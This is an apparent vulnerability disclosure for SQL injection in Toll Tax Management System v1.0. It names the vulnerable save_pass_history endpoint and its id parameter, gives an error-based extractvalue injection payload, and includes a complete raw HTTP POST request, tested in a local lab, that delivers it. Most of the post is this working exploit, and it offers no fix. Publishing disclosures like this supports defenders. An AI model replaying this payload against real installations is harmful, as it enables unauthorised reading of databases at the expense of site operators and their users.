# toll-tax-management-system v1.0 has SQL injection

vendors: https://www.sourcecodester.com/php/15304/toll-tax-management-system-phpoop-free-source-code.html

Date: 2022-05-07

Vulnerability File: /ttms/classes/Master.php?f=save_pass_history

Vulnerability location:/ttms/classes/Master.php?f=save_pass_history, id

[+] Payload: 3'and/**/extractvalue(1,concat(char(126),database()))and' ---> id

Tested on Windows 10, XAMPP

```
POST /ttms/classes/Master.php?f=save_pass_history HTTP/1.1
Host: 192.168.2.106
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------14308677256421863342182671516
Content-Length: 567
Origin: http://192.168.2.106
Connection: keep-alive
Referer: http://192.168.2.106/ttms/admin/?page=pass_history/manage_pass_history&id=3
Cookie: PHPSESSID=0389fublnj7ggho8q04fuvfaqe

-----------------------------14308677256421863342182671516
Content-Disposition: form-data; name="id"

3'and/**/extractvalue(1,concat(char(126),database()))and'
-----------------------------14308677256421863342182671516
Content-Disposition: form-data; name="pass_id"

2
-----------------------------14308677256421863342182671516
Content-Disposition: form-data; name="toll_id"

2
-----------------------------14308677256421863342182671516
Content-Disposition: form-data; name="cost"

100.00
-----------------------------14308677256421863342182671516--

```

![](https://github.com/mikeccltt/badminton-center-management-system/blob/main/sql.gif?raw=true)

